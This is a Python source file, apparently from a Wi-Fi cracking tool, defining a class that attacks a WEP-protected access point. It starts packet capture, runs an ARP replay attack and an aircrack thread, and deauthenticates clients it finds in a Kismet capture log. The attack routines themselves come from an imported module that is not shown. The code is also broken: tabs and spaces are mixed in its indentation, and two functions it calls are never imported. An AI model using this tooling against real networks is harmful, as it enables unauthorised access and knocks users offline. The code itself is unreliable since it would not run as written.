#!/usr/bin/python
# -*- coding: utf-8 -*-

from Utils import network_listening, arp_attack, keep_alive_packet, result_aircrack_wep
import threading
import xml.etree.ElementTree as ET
import os
import signal
import logging
from WEPThread import WEPThread

class WEPListening():
    """
    WEPListening is a specific class to handle the cracking of a Wifibox
    which uses WEP security

    .. todo: Create a SuperClass to merge WEPListening and WPAListening common behaviours
    """
    def __init__(self, box):
        """
        :param box: The box to crack

        .. note:: It creates also 3 fields to handle the pids of processing threads
        """
        self.box = box
        self.focus_listen_pid = None
        self.arp_pid = None
        self.keep_alive_pid = None
        self.aircrack_thread = None

    def startListening(self):
		"""
		start the listening and execute all the processes to attack a network
		"""
        logging.info("Starting listening on %s", self.box._ESSID)
        dir_path = "TestBox/" + self.box._ESSID
        if not os.path.isdir(dir_path):
            os.mkdir(dir_path)
        self.focus_listen_pid = network_listening(self.box)
        self.keep_alive_pid = keep_alive_packet(self.box)
        self.arp_pid = arp_attack(self.box)
        self.aircrack_thread = WEPThread(self.box, dir_path)
        self.aircrack_thread.start()

    def speed_up_process(self, box):
        """
		deauthentification the clients to generate packets to catch
		:param box: The box to crack
        """
        tab_client = []
        dir_name = "TestBox"
        nom_ecoute = "record"
        path = dir_name + "/" + box._ESSID
        nom_fichier_xml_ecoute_local = path + "/" + nom_ecoute + "-01.kismet.netxml"
        try:
            sub_tree = ET.parse(nom_fichier_xml_ecoute_local)
            sub_root = sub_tree.getroot()
            for child in sub_root:
                for c_tmp in child.findall('wireless-client'):
                    mac_client = c_tmp.find('client-mac').text
                    client = client_wifi(mac_client)
                    tab_client.append(client)
            for client in tab_client:
                deauthentication_attack(self.box, client)
        except:
            # logging.critical("Cannot open or parse %s", nom_fichier_xml_ecoute_local)
            pass

    def update(self):
        self.speed_up_process(self.box)

    def stopListening(self):
		"""
		close all the processes and stop the listening
		"""
        logging.info("Stopping listening on %s...", self.box._ESSID)
        try:
            os.killpg(self.focus_listen_pid, signal.SIGTERM)
        except:
            pass
        try:
            os.killpg(self.arp_pid, signal.SIGTERM)
        except:
            pass
        try:
            os.killpg(self.keep_alive_pid, signal.SIGTERM)
        except:
            pass
        self.aircrack_thread.stop()
        logging.info("Listening on %s stopped !", self.box._ESSID)

    def __eq__(self, other):
		"""
		Check if two box are equal
		:param box: the box you're comparing with
		"""
        return self.box == other.box
